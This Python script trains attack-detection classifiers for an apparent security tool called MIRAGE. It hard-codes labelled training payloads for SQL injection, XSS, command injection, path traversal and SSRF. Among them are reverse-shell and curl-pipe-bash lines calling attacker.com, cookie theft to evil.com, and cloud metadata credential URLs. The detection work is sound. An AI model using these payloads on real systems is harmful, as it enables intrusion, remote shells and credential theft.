#!/usr/bin/env python3
"""
MIRAGE ML Model Training Pipeline
Train attack detection models from labeled datasets
"""
import os
import sys
import time
import json
import pickle
import argparse
import numpy as np
import pandas as pd
from pathlib import Path
from typing import List, Dict, Tuple, Optional
from dataclasses import dataclass
from collections import defaultdict

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.models import RequestContext
from ml.feature_extraction import FeatureExtractor, FeatureVector

# ============================================================================
# ATTACK PAYLOAD DATASETS
# ============================================================================

# SQL Injection payloads for training
SQLI_PAYLOADS = [
    # Basic SQLi
    "' OR '1'='1", "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
    "admin'--", "admin' #", "admin'/*", "' OR 'x'='x",
    "1' AND '1'='1", "1' AND 1=1--", "1 OR 1=1", "1' OR '1'='1'--",
    
    # UNION-based
    "' UNION SELECT NULL--", "' UNION SELECT 1,2,3--",
    "' UNION SELECT username,password FROM users--",
    "' UNION ALL SELECT NULL,NULL,NULL--",
    "1' UNION SELECT 1,@@version--",
    "' UNION SELECT table_name FROM information_schema.tables--",
    
    # Error-based
    "' AND 1=CONVERT(int,@@version)--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
    "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
    
    # Time-based blind
    "' AND SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--",
    "' AND BENCHMARK(10000000,SHA1('test'))--",
    "1' AND (SELECT SLEEP(5))--",
    
    # Stacked queries
    "'; DROP TABLE users;--", "'; INSERT INTO users VALUES('hacker','pass');--",
    "'; UPDATE users SET password='hacked' WHERE username='admin';--",
    
    # Boolean-based blind
    "' AND 1=1--", "' AND 1=2--", "' AND SUBSTRING(@@version,1,1)='5'--",
    
    # Advanced
    "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--",
    "-1' UNION SELECT LOAD_FILE('/etc/passwd')--",
    "1'; EXEC xp_cmdshell('whoami');--",
    
    # Encoded variants
    "%27%20OR%201%3D1--", "&#39; OR 1=1--", "\\' OR 1=1--",
    "' %4fR 1=1--", "' o/**/r 1=1--",
]

# XSS payloads
XSS_PAYLOADS = [
    # Basic script tags
    "<script>alert(1)</script>", "<script>alert('XSS')</script>",
    "<script src=//evil.com/xss.js></script>",
    "<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
    
    # Event handlers
    "<img src=x onerror=alert(1)>", "<img/src=x onerror=alert(1)>",
    "<svg onload=alert(1)>", "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<marquee onstart=alert(1)>", "<video><source onerror=alert(1)>",
    "<details open ontoggle=alert(1)>",
    
    # JavaScript protocol
    "javascript:alert(1)", "javascript:alert(document.cookie)",
    "<a href=javascript:alert(1)>click</a>",
    "<iframe src=javascript:alert(1)>",
    
    # Data URI
    "<object data=data:text/html,<script>alert(1)</script>>",
    "<embed src=data:text/html,<script>alert(1)</script>>",
    
    # SVG-based
    "<svg><script>alert(1)</script></svg>",
    "<svg><animate onbegin=alert(1)>",
    "<svg><set onbegin=alert(1)>",
    
    # Filter bypass
    "<ScRiPt>alert(1)</ScRiPt>", "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<<script>script>alert(1)<</script>/script>",
    
    # DOM-based
    "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
    "<img src=x onerror=this['ale'+'rt'](1)>",
    
    # Encoded
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
]

# Command injection / RCE payloads
RCE_PAYLOADS = [
    # Basic command chaining
    "; ls -la", "| ls", "& ls", "&& ls", "|| ls",
    "; cat /etc/passwd", "| cat /etc/passwd",
    "; whoami", "| whoami", "&& whoami",
    
    # Command substitution
    "$(whoami)", "`whoami`", "$(cat /etc/passwd)",
    "`cat /etc/passwd`", "$(id)", "`id`",
    
    # Pipes and redirects
    "| nc -e /bin/sh attacker.com 4444",
    "; curl http://attacker.com/shell.sh | bash",
    "| wget http://attacker.com/malware -O /tmp/m && chmod +x /tmp/m && /tmp/m",
    
    # Environment variables
    "${IFS}cat${IFS}/etc/passwd", "$IFS/bin/cat$IFS/etc/passwd",
    
    # Python
    "__import__('os').system('id')",
    "exec('import os;os.system(\"id\")')",
    "eval(compile('import os;os.system(\"id\")','','exec'))",
    
    # PHP
    "<?php system('id'); ?>", "<?=`id`?>",
    "passthru('id');", "shell_exec('id');",
    
    # Node.js
    "require('child_process').exec('id')",
    "process.mainModule.require('child_process').execSync('id')",
    
    # Template injection
    "{{constructor.constructor('return this')()}}", 
    "${7*7}", "{{7*7}}", "<%=7*7%>", "${T(java.lang.Runtime).getRuntime().exec('id')}",
    
    # Encoded
    "%3Bls", "%7Ccat%20/etc/passwd", "%26%26whoami",
]

# Path traversal / LFI payloads
LFI_PAYLOADS = [
    # Basic traversal
    "../../../etc/passwd", "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/passwd", "..%2f..%2f..%2fetc/passwd",
    
    # Null byte
    "../../../etc/passwd%00", "../../../etc/passwd%00.jpg",
    
    # PHP wrappers
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://input", "php://filter/read=string.rot13/resource=/etc/passwd",
    "expect://id", "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+",
    
    # Double encoding
    "%252e%252e%252fetc/passwd", "..%c0%af..%c0%af../etc/passwd",
    
    # Interesting files
    "/etc/shadow", "/etc/hosts", "/proc/self/environ",
    "/var/log/apache2/access.log", "/var/log/auth.log",
    "C:\\Windows\\win.ini", "C:\\boot.ini",
    
    # Zip/phar
    "zip://shell.jpg#payload.php", "phar://test.phar/test.txt",
]

# SSRF payloads
SSRF_PAYLOADS = [
    # Localhost variants
    "http://127.0.0.1", "http://localhost", "http://0.0.0.0",
    "http://127.1", "http://127.0.0.1:22", "http://localhost:3306",
    "http://[::1]", "http://0177.0.0.1", "http://2130706433",
    
    # AWS metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data/",
    
    # Cloud metadata
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/v1/",
    
    # Private IPs
    "http://10.0.0.1", "http://172.16.0.1", "http://192.168.1.1",
    "http://10.0.0.1:8080/admin", "http://192.168.0.1:8443",
    
    # Protocol handlers
    "file:///etc/passwd", "gopher://127.0.0.1:25/",
    "dict://127.0.0.1:11211/", "ftp://127.0.0.1/",
    
    # Bypass techniques
    "http://127.0.0.1.nip.io", "http://spoofed.burpcollaborator.net",
    "http://127.0.0.1@evil.com", "http://evil.com#@127.0.0.1",
]

# Bot/scanner signatures (in user-agent)
BOT_SIGNATURES = [
    "sqlmap/1.0", "Nikto/2.1.6", "Nmap Scripting Engine",
    "Nessus", "Acunetix", "w3af", "Burp", "ZAP",
    "masscan", "gobuster", "dirb", "wfuzz", "ffuf",
    "python-requests/2.25.1", "curl/7.64.1", "Go-http-client",
    "Wget/1.20.3", "libwww-perl", "Java/1.8.0_201",
]

# Normal/benign traffic
BENIGN_PAYLOADS = [
    # Normal search queries
    "hello world", "search query", "product name",
    "best restaurants near me", "how to cook pasta",
    "weather forecast tomorrow", "latest news",
    
    # Normal parameters
    "page=1", "limit=10", "sort=asc", "order=date",
    "id=12345", "category=electronics", "filter=active",
    "lang=en", "format=json", "callback=handleResponse",
    
    # Normal form data
    "username=john_doe", "email=john@example.com",
    "password=SecurePass123!", "confirm=yes",
    "message=Hello, I have a question about your product.",
    "comment=Great article! Thanks for sharing.",
    
    # Normal URLs
    "https://example.com/page", "https://cdn.example.com/image.jpg",
    "/api/v1/users", "/products/12345", "/checkout",
    
    # Normal JSON-like
    '{"name": "John", "age": 30}', '{"items": [1, 2, 3]}',
    
    # Normal file operations
    "document.pdf", "image.png", "report_2024.xlsx",
    
    # Edge cases that might look suspicious but are benign
    "don't worry", "1 < 2 and 2 > 1", "SELECT * FROM menu",  # Menu item
    "script writing tips", "union jack flag", "drop shipping",
]


@dataclass
class TrainingConfig:
    """Training configuration"""
    output_dir: str = "./models"
    test_size: float = 0.2
    random_state: int = 42
    
    # Model hyperparameters
    lr_max_iter: int = 1000
    lr_class_weight: str = "balanced"
    
    # Thresholds
    attack_threshold: float = 0.5
    high_confidence_threshold: float = 0.8


class DatasetGenerator:
    """Generate training dataset from payloads"""
    
    def __init__(self):
        self.feature_extractor = FeatureExtractor()
    
    def generate_dataset(self, 
                        augment: bool = True,
                        samples_per_category: int = 200) -> pd.DataFrame:
        """Generate labeled dataset with features"""
        
        print("🔧 Generating training dataset...")
        
        data = []
        
        # Attack categories
        categories = [
            ("SQLI", SQLI_PAYLOADS),
            ("XSS", XSS_PAYLOADS),
            ("RCE", RCE_PAYLOADS),
            ("LFI", LFI_PAYLOADS),
            ("SSRF", SSRF_PAYLOADS),
        ]
        
        for category, payloads in categories:
            print(f"   Processing {category}: {len(payloads)} base payloads")
            
            for payload in payloads:
                # Extract features from payload in different contexts
                features = self._extract_features_multi_context(payload)
                
                for feature_dict in features:
                    feature_dict["label"] = 1  # Attack
                    feature_dict["category"] = category
                    feature_dict["raw_payload"] = payload[:100]
                    data.append(feature_dict)
                
                # Augment with variations
                if augment:
                    augmented = self._augment_payload(payload, category)
                    for aug_payload in augmented:
                        features = self._extract_features_multi_context(aug_payload)
                        for feature_dict in features:
                            feature_dict["label"] = 1
                            feature_dict["category"] = category
                            feature_dict["raw_payload"] = aug_payload[:100]
                            data.append(feature_dict)
        
        # Bot signatures (from user-agent)
        print(f"   Processing BOT: {len(BOT_SIGNATURES)} signatures")
        for ua in BOT_SIGNATURES:
            ctx = self._make_context(
                query="page=1",
                headers={"user-agent": ua}
            )
            feature_vec = self.feature_extractor.extract(ctx)
            feature_dict = self._features_to_dict(feature_vec)
            feature_dict["label"] = 1
            feature_dict["category"] = "BOT"
            feature_dict["raw_payload"] = ua[:100]
            data.append(feature_dict)
        
        # Benign traffic
        print(f"   Processing NORMAL: {len(BENIGN_PAYLOADS)} payloads")
        for payload in BENIGN_PAYLOADS:
            features = self._extract_features_multi_context(payload)
            for feature_dict in features:
                feature_dict["label"] = 0  # Normal
                feature_dict["category"] = "NORMAL"
                feature_dict["raw_payload"] = payload[:100]
                data.append(feature_dict)
            
            # Add more benign variations
            if augment:
                for _ in range(3):
                    augmented = self._augment_benign(payload)
                    features = self._extract_features_multi_context(augmented)
                    for feature_dict in features:
                        feature_dict["label"] = 0
                        feature_dict["category"] = "NORMAL"
                        feature_dict["raw_payload"] = augmented[:100]
                        data.append(feature_dict)
        
        df = pd.DataFrame(data)
        
        # Balance dataset
        print(f"\n📊 Dataset stats before balancing:")
        print(df["category"].value_counts())
        
        # Undersample majority classes
        min_samples = min(df["category"].value_counts())
        balanced_dfs = []
        for cat in df["category"].unique():
            cat_df = df[df["category"] == cat]
            if len(cat_df) > samples_per_category:
                cat_df = cat_df.sample(n=samples_per_category, random_state=42)
            balanced_dfs.append(cat_df)
        
        df = pd.concat(balanced_dfs, ignore_index=True)
        
        print(f"\n📊 Dataset stats after balancing:")
        print(df["category"].value_counts())
        print(f"\n   Total samples: {len(df)}")
        
        return df
    
    def _extract_features_multi_context(self, payload: str) -> List[Dict]:
        """Extract features from payload in multiple contexts"""
        results = []
        
        # As query parameter
        ctx = self._make_context(query=f"input={payload}")
        feature_vec = self.feature_extractor.extract(ctx)
        results.append(self._features_to_dict(feature_vec))
        
        # As path component
        ctx = self._make_context(path=f"/api/{payload}")
        feature_vec = self.feature_extractor.extract(ctx)
        results.append(self._features_to_dict(feature_vec))
        
        # As body
        ctx = self._make_context(body=payload.encode(), method="POST")
        feature_vec = self.feature_extractor.extract(ctx)
        results.append(self._features_to_dict(feature_vec))
        
        return results
    
    def _make_context(self, 
                     method: str = "GET",
                     path: str = "/api/test",
                     query: str = "",
                     body: bytes = b"",
                     headers: Optional[Dict] = None) -> RequestContext:
        """Create request context"""
        import uuid
        
        default_headers = {
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "accept": "text/html,application/xhtml+xml",
            "accept-language": "en-US,en;q=0.9",
        }
        if headers:
            default_headers.update(headers)
        
        return RequestContext(
            request_id=str(uuid.uuid4()),
            timestamp=time.time(),
            client_ip="192.0.2.1",  # TEST-NET IP
            client_port=12345,
            server_ip="10.0.0.1",
            server_port=8080,
            method=method,
            path=path,
            query_string=query,
            headers=default_headers,
            body=body,
        )
    
    def _features_to_dict(self, feature_vec: FeatureVector) -> Dict:
        """Convert FeatureVector to dict"""
        return {f"f_{i}": v for i, v in enumerate(feature_vec.features)}
    
    def _augment_payload(self, payload: str, category: str) -> List[str]:
        """Generate augmented versions of payload"""
        augmented = []
        
        # Case variations
        augmented.append(payload.upper())
        augmented.append(payload.lower())
        augmented.append(payload.swapcase())
        
        # Whitespace variations
        augmented.append(payload.replace(" ", "  "))
        augmented.append(payload.replace(" ", "\t"))
        augmented.append(f"  {payload}  ")
        
        # URL encoding variations
        import urllib.parse
        augmented.append(urllib.parse.quote(payload))
        augmented.append(urllib.parse.quote(payload, safe=''))
        
        # Comment injection (SQL)
        if category == "SQLI":
            augmented.append(payload.replace(" ", "/**/"))
            augmented.append(payload.replace("OR", "||"))
            augmented.append(payload.replace("AND", "&&"))
        
        # HTML entity encoding (XSS)
        if category == "XSS":
            augmented.append(payload.replace("<", "&lt;").replace(">", "&gt;"))
            augmented.append(payload.replace("script", "scr\x00ipt"))
        
        return augmented[:5]  # Limit augmentations
    
    def _augment_benign(self, payload: str) -> str:
        """Generate benign variations"""
        import random
        
        variations = [
            payload + str(random.randint(1, 100)),
            payload.title(),
            payload + " please",
            "the " + payload,
            payload.replace(" ", "_"),
        ]
        return random.choice(variations)


class ModelTrainer:
    """Train ML models for attack detection"""
    
    def __init__(self, config: TrainingConfig = None):
        self.config = config or TrainingConfig()
        os.makedirs(self.config.output_dir, exist_ok=True)
    
    def train(self, df: pd.DataFrame) -> Dict:
        """Train all models"""
        print("\n🎯 Training models...")
        
        # Prepare features and labels
        feature_cols = [c for c in df.columns if c.startswith("f_")]
        X = df[feature_cols].values
        y_binary = df["label"].values
        y_category = df["category"].values
        
        # Encode categories
        categories = sorted(df["category"].unique())
        cat_to_idx = {cat: idx for idx, cat in enumerate(categories)}
        y_cat_encoded = np.array([cat_to_idx[c] for c in y_category])
        
        # Split data
        from sklearn.model_selection import train_test_split
        X_train, X_test, y_train, y_test, y_cat_train, y_cat_test = train_test_split(
            X, y_binary, y_cat_encoded,
            test_size=self.config.test_size,
            random_state=self.config.random_state,
            stratify=y_binary
        )
        
        print(f"   Train size: {len(X_train)}, Test size: {len(X_test)}")
        
        # Train binary classifier
        print("\n📈 Training binary classifier (attack vs normal)...")
        binary_model, binary_metrics = self._train_binary_classifier(
            X_train, X_test, y_train, y_test
        )
        
        # Train multi-class classifier
        print("\n📈 Training category classifier...")
        category_model, category_metrics = self._train_category_classifier(
            X_train, X_test, y_cat_train, y_cat_test, categories
        )
        
        # Save models
        self._save_models(binary_model, category_model, categories, feature_cols)
        
        # Return metrics
        return {
            "binary": binary_metrics,
            "category": category_metrics,
            "categories": categories,
            "num_features": len(feature_cols),
        }
    
    def _train_binary_classifier(self, X_train, X_test, y_train, y_test):
        """Train binary attack classifier"""
        from sklearn.linear_model import LogisticRegression
        from sklearn.ensemble import RandomForestClassifier, GradientBoostingClassifier
        from sklearn.metrics import (
            accuracy_score, precision_score, recall_score, 
            f1_score, roc_auc_score, classification_report
        )
        
        # Try multiple models
        models = {
            "LogisticRegression": LogisticRegression(
                max_iter=self.config.lr_max_iter,
                class_weight=self.config.lr_class_weight,
                random_state=self.config.random_state
            ),
            "RandomForest": RandomForestClassifier(
                n_estimators=100,
                class_weight="balanced",
                random_state=self.config.random_state,
                n_jobs=-1
            ),
        }
        
        best_model = None
        best_f1 = 0
        
        for name, model in models.items():
            model.fit(X_train, y_train)
            y_pred = model.predict(X_test)
            y_prob = model.predict_proba(X_test)[:, 1]
            
            f1 = f1_score(y_test, y_pred)
            
            print(f"\n   {name}:")
            print(f"      Accuracy:  {accuracy_score(y_test, y_pred):.4f}")
            print(f"      Precision: {precision_score(y_test, y_pred):.4f}")
            print(f"      Recall:    {recall_score(y_test, y_pred):.4f}")
            print(f"      F1 Score:  {f1:.4f}")
            print(f"      ROC AUC:   {roc_auc_score(y_test, y_prob):.4f}")
            
            if f1 > best_f1:
                best_f1 = f1
                best_model = model
                best_name = name
        
        print(f"\n   ✅ Best binary model: {best_name} (F1={best_f1:.4f})")
        
        # Get final metrics
        y_pred = best_model.predict(X_test)
        y_prob = best_model.predict_proba(X_test)[:, 1]
        
        metrics = {
            "accuracy": float(accuracy_score(y_test, y_pred)),
            "precision": float(precision_score(y_test, y_pred)),
            "recall": float(recall_score(y_test, y_pred)),
            "f1": float(f1_score(y_test, y_pred)),
            "roc_auc": float(roc_auc_score(y_test, y_prob)),
            "model_type": best_name,
        }
        
        return best_model, metrics
    
    def _train_category_classifier(self, X_train, X_test, y_train, y_test, categories):
        """Train multi-class category classifier"""
        from sklearn.linear_model import LogisticRegression
        from sklearn.ensemble import RandomForestClassifier
        from sklearn.metrics import accuracy_score, classification_report
        
        # Use RandomForest for multi-class
        model = RandomForestClassifier(
            n_estimators=100,
            class_weight="balanced",
            random_state=self.config.random_state,
            n_jobs=-1
        )
        
        model.fit(X_train, y_train)
        y_pred = model.predict(X_test)
        
        accuracy = accuracy_score(y_test, y_pred)
        print(f"\n   Category accuracy: {accuracy:.4f}")
        print("\n   Classification Report:")
        print(classification_report(y_test, y_pred, target_names=categories))
        
        metrics = {
            "accuracy": float(accuracy),
            "categories": categories,
        }
        
        return model, metrics
    
    def _save_models(self, binary_model, category_model, categories, feature_cols):
        """Save trained models"""
        from sklearn.linear_model import LogisticRegression
        
        # Save sklearn models
        binary_path = os.path.join(self.config.output_dir, "binary_classifier.pkl")
        category_path = os.path.join(self.config.output_dir, "category_classifier.pkl")
        
        with open(binary_path, 'wb') as f:
            pickle.dump(binary_model, f)
        print(f"\n💾 Saved binary model: {binary_path}")
        
        with open(category_path, 'wb') as f:
            pickle.dump(category_model, f)
        print(f"💾 Saved category model: {category_path}")
        
        # Save as LightweightEnsemble format for inference.py
        from ml.inference import LightweightEnsemble
        
        lightweight = LightweightEnsemble()
        
        # Extract weights for logistic regression
        if hasattr(binary_model, 'coef_'):
            # Logistic Regression
            lightweight.lr_weights = np.concatenate([
                binary_model.coef_[0], 
                binary_model.intercept_
            ])
        else:
            # For RandomForest, use feature importances as proxy
            # (This is a simplification - real deployment should use the RF directly)
            importances = binary_model.feature_importances_
            lightweight.lr_weights = np.concatenate([importances * 10, [0.0]])
        
        # Category weights from RandomForest feature importances per class
        # (Simplified - using overall importances)
        n_features = len(feature_cols)
        lightweight.category_weights = np.zeros((len(categories), n_features))
        
        if hasattr(category_model, 'feature_importances_'):
            for i in range(len(categories)):
                lightweight.category_weights[i] = category_model.feature_importances_
        
        lightweight_path = os.path.join(self.config.output_dir, "lightweight_model.pkl")
        lightweight.save(lightweight_path)
        print(f"💾 Saved lightweight model: {lightweight_path}")
        
        # Save metadata
        metadata = {
            "categories": categories,
            "feature_cols": feature_cols,
            "num_features": len(feature_cols),
            "binary_model_type": type(binary_model).__name__,
            "category_model_type": type(category_model).__name__,
        }
        
        metadata_path = os.path.join(self.config.output_dir, "model_metadata.json")
        with open(metadata_path, 'w') as f:
            json.dump(metadata, f, indent=2)
        print(f"💾 Saved metadata: {metadata_path}")


def main():
    parser = argparse.ArgumentParser(description="Train MIRAGE ML models")
    
    parser.add_argument("--output-dir", default="./models", help="Output directory for models")
    parser.add_argument("--dataset", help="Path to existing CSV dataset (optional)")
    parser.add_argument("--save-dataset", help="Save generated dataset to CSV")
    parser.add_argument("--no-augment", action="store_true", help="Disable data augmentation")
    parser.add_argument("--samples", type=int, default=200, help="Samples per category")
    
    args = parser.parse_args()
    
    print("=" * 70)
    print("MIRAGE ML Model Training")
    print("=" * 70)
    
    # Generate or load dataset
    if args.dataset and os.path.exists(args.dataset):
        print(f"\n📂 Loading dataset from {args.dataset}")
        df = pd.read_csv(args.dataset)
    else:
        generator = DatasetGenerator()
        df = generator.generate_dataset(
            augment=not args.no_augment,
            samples_per_category=args.samples
        )
        
        if args.save_dataset:
            df.to_csv(args.save_dataset, index=False)
            print(f"\n💾 Saved dataset to {args.save_dataset}")
    
    # Train models
    config = TrainingConfig(output_dir=args.output_dir)
    trainer = ModelTrainer(config)
    
    try:
        metrics = trainer.train(df)
        
        print("\n" + "=" * 70)
        print("TRAINING COMPLETE")
        print("=" * 70)
        print(f"\n📊 Binary Classifier Metrics:")
        print(f"   Accuracy:  {metrics['binary']['accuracy']:.4f}")
        print(f"   Precision: {metrics['binary']['precision']:.4f}")
        print(f"   Recall:    {metrics['binary']['recall']:.4f}")
        print(f"   F1 Score:  {metrics['binary']['f1']:.4f}")
        print(f"   ROC AUC:   {metrics['binary']['roc_auc']:.4f}")
        
        print(f"\n📊 Category Classifier Accuracy: {metrics['category']['accuracy']:.4f}")
        
        print(f"\n✅ Models saved to: {args.output_dir}")
        
    except ImportError as e:
        print(f"\n❌ Missing dependency: {e}")
        print("\nInstall sklearn for training:")
        print("   pip install scikit-learn pandas")


if __name__ == "__main__":
    main()
